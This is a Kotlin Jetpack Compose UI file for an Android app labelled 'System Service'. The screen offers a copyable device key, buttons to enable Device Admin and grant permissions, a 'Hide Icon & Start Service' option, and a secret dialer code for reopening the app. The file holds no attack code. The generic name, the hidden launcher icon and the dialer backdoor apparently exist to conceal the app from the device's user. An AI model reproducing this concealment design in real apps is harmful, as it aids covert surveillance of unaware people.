package com.guard.screen.ui.screen

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.guard.screen.core.Constants
import com.guard.screen.ui.components.AlertBanner
import com.guard.screen.ui.components.AlertType
import com.guard.screen.ui.components.PrimaryButton
import com.guard.screen.ui.components.SecondaryButton
import com.guard.screen.ui.viewmodel.MainUiState

@Composable
fun MainScreen(
    uiState: MainUiState,
    onEnableAdmin: () -> Unit,
    onGrantPermissions: () -> Unit,
    onStartSetup: () -> Unit,
    onHideAndStart: () -> Unit,
    onCopyKey: () -> Unit,
    onShowIcon: () -> Unit
) {
    Scaffold { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(MaterialTheme.colorScheme.background)
                .padding(padding)
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 24.dp, vertical = 16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Spacer(modifier = Modifier.height(24.dp))

            // App Icon
            Box(
                modifier = Modifier
                    .size(96.dp)
                    .clip(CircleShape)
                    .background(MaterialTheme.colorScheme.primary),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Security,
                    contentDescription = null,
                    tint = MaterialTheme.colorScheme.onPrimary,
                    modifier = Modifier.size(48.dp)
                )
            }

            Spacer(modifier = Modifier.height(20.dp))

            Text(
                text = "System Service",
                style = MaterialTheme.typography.headlineMedium,
                fontWeight = FontWeight.Bold,
                color = MaterialTheme.colorScheme.onBackground
            )

            Spacer(modifier = Modifier.height(6.dp))

            Text(
                text = "Device Key (save this):",
                style = MaterialTheme.typography.bodyMedium,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )

            Spacer(modifier = Modifier.height(10.dp))

            // Device Key
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(
                        color = MaterialTheme.colorScheme.surfaceVariant,
                        shape = RoundedCornerShape(12.dp)
                    )
                    .padding(vertical = 14.dp, horizontal = 16.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = uiState.deviceKey,
                    style = MaterialTheme.typography.titleLarge,
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    color = MaterialTheme.colorScheme.primary,
                    textAlign = TextAlign.Center,
                    letterSpacing = 1.sp
                )
            }

            Spacer(modifier = Modifier.height(10.dp))

            SecondaryButton(
                text = "Copy Key",
                onClick = onCopyKey,
                modifier = Modifier.height(44.dp)
            )

            Spacer(modifier = Modifier.height(24.dp))

            // Status
            if (uiState.isSetupComplete) {
                AlertBanner(
                    message = "✓ Setup complete — service running",
                    type = AlertType.SUCCESS
                )
                Spacer(modifier = Modifier.height(16.dp))
            }

            // Buttons
            PrimaryButton(
                text = "Enable Device Admin",
                onClick = onEnableAdmin,
                icon = Icons.Default.Lock
            )

            Spacer(modifier = Modifier.height(10.dp))

            PrimaryButton(
                text = "Grant Permissions",
                onClick = onGrantPermissions,
                icon = Icons.Default.CheckCircle
            )

            Spacer(modifier = Modifier.height(10.dp))

            PrimaryButton(
                text = "Start Setup Wizard",
                onClick = onStartSetup,
                icon = Icons.Default.Settings
            )

            Spacer(modifier = Modifier.height(20.dp))

            if (uiState.isIconHidden) {
                PrimaryButton(
                    text = "Show Icon",
                    onClick = onShowIcon,
                    icon = Icons.Default.Visibility
                )
            } else {
                PrimaryButton(
                    text = "Hide Icon & Start Service",
                    onClick = onHideAndStart
                )
            }

            Spacer(modifier = Modifier.height(20.dp))

            Text(
                text = "To reopen later, dial:\n*#*#6969#*#*",
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
                textAlign = TextAlign.Center,
                fontFamily = FontFamily.Monospace
            )

            Spacer(modifier = Modifier.height(32.dp))
        }
    }
}
